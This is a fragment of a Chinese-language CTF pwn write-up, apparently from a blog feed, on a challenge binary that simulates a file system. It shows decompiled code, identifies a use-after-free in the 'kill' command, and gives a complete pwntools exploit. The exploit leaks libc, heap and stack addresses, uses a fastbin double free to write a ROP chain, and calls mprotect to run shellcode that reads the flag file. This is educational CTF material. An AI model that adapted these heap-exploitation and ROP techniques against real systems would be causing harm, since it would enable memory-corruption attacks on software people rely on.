sub_3E2C();  root_dir = create(&quot;/&quot;, 1, 0LL, 7);            // 创建文件夹  root_ptr = root_dir;  HRP = create(&quot;HRP&quot;, 0, 0LL, 7);               // 创建文件  linkfile(root_dir, HRP);                      // /HRP  mkflag(root_dir);  while ( 1 )  &#123;    printf(&quot;&gt; &quot;);    fgets(s, 2560, stdin);    s[strcspn(s, &quot;\n&quot;)] = 0;    menu(&amp;root_ptr, s, root_dir, HRP);    fflush(stdin);  &#125;&#125;</code></pre><p>其中create函数可以得知他可以根据所给参数判断是创建文件或文件夹，文件的部分大致如下：</p><pre><code class="hljs">|文件名指针|         ||文件内容指针|上级文档| |文件类型  |下一个文件 ||文件大小  |          |</code></pre><p>这里最难绷的是ida本身可能会出现点反编译的错误，所以我们需要在给数据结构赋值过程中查看汇编语言来帮助我们逆向，在其中会出现malloc的情况，除此之外我们还需要注意到strdup这个函数。</p><p>strdup这个函数是一个复制函数，他会在内部malloc一定空间，然后复制参数到其中，最后将该空间作为返回值传递，因此他也经常与free函数一起出现，但是这里我们发现并没有。</p><p>然后函数就是让我们不断传递控制命令，其中有漏洞的地方就是kill命令有一个uaf，如下：</p><pre><code class="hljs">  else if ( !strcmp(command_0, &quot;kill&quot;) )  &#123;    v12 = atoi(command_1);    if ( v12 &gt;= 0 &amp;&amp; v12 &lt;= exec_num )    &#123;      free(*(*(&amp;process + v12) + 8LL));      free(*(&amp;process + v12));      --exec_num;      printf(&quot;%d had been killed\n&quot;, v12);    &#125;  &#125;</code></pre><p>这里我们采用的方式是先填充tcache，通过unsortbin来泄露libc和heap基地址，然后在fastbin中构造A-B-A来进攻击，最后修改我们menu函数的返回值来写ROP</p><p>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./computer&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;a&#39;*0xe7)for i in range(16):    sla(&quot;&gt; &quot;, b&#39;exec &#39; + b&#39;a&#39;*0xe7)for i in range(10):    sla(&quot;&gt; &quot;, b&#39;touch &#39; + str(i).encode())for i in range(8)[::-1]:    sla(&quot;&gt; &quot;, b&quot;kill &quot; + str(i).encode())# now we have tcache(0x20):7, tcache(0xf0):7, fastbin(0x20):1, unsortbin(0xf0):1sla(&quot;&gt; &quot;, b&quot;ps&quot;)libc_base = get_address() - 0x3ebca0slog(&quot;libc_base&quot;, libc_base)libc = ELF(&#39;./libc-2.27.so&#39;)sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;b&#39;*8 + p64(libc_base + libc.sym[&#39;_environ&#39;]))sla(&quot;&gt; &quot;, b&#39;ps&#39;)ru(&#39;\x09&#39;)ru(&#39;\x09&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x660slog(&quot;heap_base&quot;, heap_base)ru(&#39;\x09&#39;)stack_addr = u64(rc(6).ljust(8, b&#39;\x00&#39;))slog(&quot;stack_addr&quot;, stack_addr)sla(&quot;&gt; &quot;, b&#39;rm 0&#39;)  #fix the tcachesla(&quot;&gt; &quot;, b&#39;rm 1&#39;)sla(&quot;&gt; &quot;, b&#39;kill 0&#39;)sla(&quot;&gt; &quot;, b&#39;mkdir new&#39;)sla(&quot;&gt; &quot;, b&#39;cd new&#39;)sla(&quot;&gt; &quot;, b&#39;touch 00&#39;)sla(&quot;&gt; &quot;, b&#39;touch 01&#39;)sla(&quot;&gt; &quot;, b&#39;touch 02&#39;)sla(&quot;&gt; &quot;, b&#39;touch &#39; + p64(stack_addr - 0xb28))sla(&quot;&gt; &quot;, b&#39;touch &#39; + b&#39;03&#39;*0x19)slog(&quot;stack_ret&quot;, stack_addr - 0xb28)pop_rdi = libc_base + 0x2164fpop_rsi = libc_base + 0x23a6apop_rdx = libc_base + 0x1b96pop_rax = libc_base + 0x1b500jmp_rsp = libc_base + 0x2b25mprotect = libc_base + libc.sym[&#39;mprotect&#39;]flag_addr = heap_base + 0x1b90add_rsp_sub = libc_base + 0xbaf9cpl = b&#39;a&#39;*8 + p64(add_rsp_sub) + b&#39;a&#39;*(0x100-0x26) + p64(pop_rdi) + p64((stack_addr - 0xb28)&amp;(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx) +p64(7) + p64(mprotect)pl += p64(jmp_rsp)shellcode = asm(shellcraft.open(&quot;./flag&quot;, 0) + shellcraft.read(&#39;3&#39;, heap_base + 0x1440, 0x30) + shellcraft.write(1, heap_base + 0x1440, 0x30))pl += shellcodesla(&quot;&gt; &quot;, b&#39;touch &#39; + pl)io.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTFwp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
